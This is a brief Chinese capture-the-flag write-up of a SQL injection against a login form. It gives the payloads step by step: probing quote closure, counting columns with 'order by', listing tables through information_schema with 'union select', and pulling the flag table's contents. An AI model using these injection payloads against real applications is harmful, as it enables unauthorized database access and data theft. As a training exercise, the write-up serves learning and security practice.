传入 `admin` `admin'` 报错,猜测闭合方式为`'`

传入 `1' or 1=1 order by 1#` `1` 正常回显

传入 `1' or 1=1 order by 2#` `1` 正常回显

传入 `1' or 1=1 order by 3#` `1` 正常回显

传入 `1' or 1=1 order by 4#` `1` 报错,可知一共三列

传入 `1' and 1=1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#` `1` 得知共有两个table分别为`flag`和`users`

传入 `1' and 1=1 union select 1,2,group_concat(flag) from flag#` `1` getflag